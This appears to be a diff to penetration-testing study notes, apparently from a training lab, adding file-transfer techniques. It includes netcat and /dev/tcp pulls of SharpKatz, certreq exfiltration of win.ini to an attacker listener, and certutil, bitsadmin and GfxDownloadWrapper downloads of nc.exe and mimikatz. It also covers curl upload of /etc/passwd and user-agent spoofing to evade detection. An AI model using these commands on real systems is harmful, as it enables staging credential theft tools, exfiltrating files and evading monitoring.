@@ -3,6 +3,12 @@
 1. [Windows File Transfer Methods](#windows-file-transfer-methods)
 1. [Linux File Transfer Methods](#linux-file-transfer-methods)
 1. [Transferring Files with Code](#transferring-files-with-code)
+1. [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
+1. [Protected File Transfers](#protected-file-transfers)
+1. [Catching Files over HTTP/S](#catching-files-over-https)
+1. [Living off The Land](#living-off-the-land)
+1. [Detection](#detection)
+1. [Evading Detection](#evading-detection)
 
 ## Windows File Transfer Methods
 
@@ -436,4 +442,238 @@
   ```shell
   # download file
   cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
+  ```
+
+## Miscellaneous File Transfer Methods
+
+* Netcat:
+
+  ```shell
+  # on target machine
+  nc -l -p 8000 > SharpKatz.exe
+  # if it is using ncat, we would need to add --recv-only
+  # to close connection once file transfer is done
+
+  # on attacker machine
+  wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
+
+  nc -q 0 192.168.49.128 8000 < SharpKatz.exe
+  # -q 0 for closing connection once done
+  # if using ncat, we would use --send-only flag instead
+  ```
+
+  ```shell
+  # alternative method
+  # when firewall blocks inbound connections on target
+
+  # on attacker
+  sudo nc -l -p 443 -q 0 < SharpKatz.exe
+  # for ncat, use --send-only instead of -q 0
+
+  # on target
+  nc 192.168.49.128 443 > SharpKatz.exe
+  # for ncat, use --recv-only
+
+  # and if target machine does not include netcat or ncat
+  cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
+  ```
+
+* PowerShell:
+
+  * PowerShell Remoting (```WinRM```) can be used for file transfer - creates both HTTP (TCP/5985) and HTTPS (TCP/5986) listener.
+
+  * To create a session, we would need admin access, be a member of ```Remote Management Users``` group, or have explicit permissions for PowerShell Remoting.
+
+  ```ps
+  # on attacker machine
+  Test-NetConnection -ComputerName DATABASE01 -Port 5985
+  # confirm WinRM port 5985 is open on target
+
+  # assuming we are Administrator on attacker machine
+  # the session already has privileges over target, so no creds need
+  $Session = New-PSSession -ComputerName DATABASE01
+  # create session and store results in variable
+
+  # copy from attacker to target
+  Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+
+  # copy from target to attacker
+  Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
+  ```
+
+* RDP:
+
+  * If we have RDP access, we can simply copy-and-paste files from one machine to another.
+
+  * For Linux, we can use ```xfreerdp``` or ```rdesktop``` - but sometimes if copy-and-paste does not work, we can mount files.
+
+  ```shell
+  # mount local resource in remote RDP session
+  # using rdesktop
+  rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
+
+  # using xfreerdp
+  xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
+
+  # to access the directory, we can connect to \\tsclient\ on Windows
+  ```
+
+## Protected File Transfers
+
+* File encryption on Windows:
+
+  * [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) can be used to encrypt files:
+
+    ```ps
+    # after transferring script to target
+    Import-Module .\Invoke-AESEncryption.ps1
+
+    # example encryption of file
+    Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
+    # encrypted file has .aes extension
+    ```
+
+* File encryption on Linux:
+
+  * ```OpenSSL``` can be used for encryption on Linux:
+
+    ```shell
+    openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
+    # provide a strong password for encryption
+
+    # to decrypt it
+    openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
+    # provide the same password for decryption
+    ```
+
+## Catching Files over HTTP/S
+
+* We can create a secure web server using ```Nginx``` for file upload operations:
+
+  ```shell
+  # create dir to handle uploaded files
+  sudo mkdir -p /var/www/uploads/SecretDir
+
+  # change owner to www-data
+  sudo chown -R www-data:www-data /var/www/uploads/SecretDir
+
+  # create nginx config file
+  sudo vim /etc/nginx/sites-available/upload.conf
+
+  # symlink new site to sites-enabled dir
+  sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+
+  # start nginx
+  sudo systemctl restart nginx.service
+
+  # verify errors
+  tail -2 `/var/log/nginx/error.log`
+  ss -lnpt | grep `80`
+  ps -ef | grep `2811`
+
+  # in this case, there is a module already listening on port 80
+  # remove default nginx config which binds on port 80
+  sudo rm /etc/nginx/sites-enabled/default
+
+  # test upload file using curl
+  curl -T /etc/passwd http://localhost:9001/SecretDir/users.txt
+
+  # check
+  tail -1 /var/www/uploads/SecretDir/users.txt
+  ```
+
+  ```shell
+  # nginx config file contents
+  server {
+    listen 9001;
+    
+    location /SecretDir/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+  }
+  ```
+
+## Living off The Land
+
+* [LOLBAS](https://lolbas-project.github.io/) - Windows:
+
+  * Search for ```/download``` or ```/upload``` in LOLBAS for binaries.
+
+  ```cmd
+  # CertReq.exe example
+
+  # on attacker machine
+  sudo nc -lvnp 80
+
+  # on target Windows machine
+  certreq.exe -Post -config http://192.168.49.128/ c:\windos\win.ini
+  # send file to nc session
+  ```
+
+* [GTFObins](https://gtfobins.github.io/) - Linux:
+
+  * Search for ```+file download``` or ```+file upload```.
+
+  ```shell
+  # openssl example
+
+  # on attacker machine
+  # create cert
+  openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+
+  # setup server
+  openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+
+  # on target Linux machine
+  openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+  ```
+
+* Other command Living off the Land tools:
+
+  ```ps
+  # bitsadmin for file download
+  bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+
+  # bitstransfer
+  Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+  ```
+
+  ```cmd
+  # certutil for file download
+  certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe
+  ```
+
+## Detection
+
+* Whitelisting commands allows for quick detection & alerts on unusual command lines.
+
+* [User agents](https://useragentstring.com/index.php) are used in the file transfers - organizations can identify potential legit user agent strings and filter out those to focus on anomalies.
+
+* Malicious file transfers can be detected by their user agents/headers.
+
+## Evading Detection
+
+* Changing user agent:
+
+  ```ps
+  # list out user agents
+  [Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+  # if Chrome is used internally, for example
+  # we can use a user agent for that with Invoke-WebRequest
+
+  $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+
+  Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
+  ```
+
+* LOLBAS / GTFObins:
+
+  ```ps
+  # in case of application whitelisting
+  # we can use living off the land binaries
+
+  # GfxDownloadWrapper.exe example
+  GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
   ```
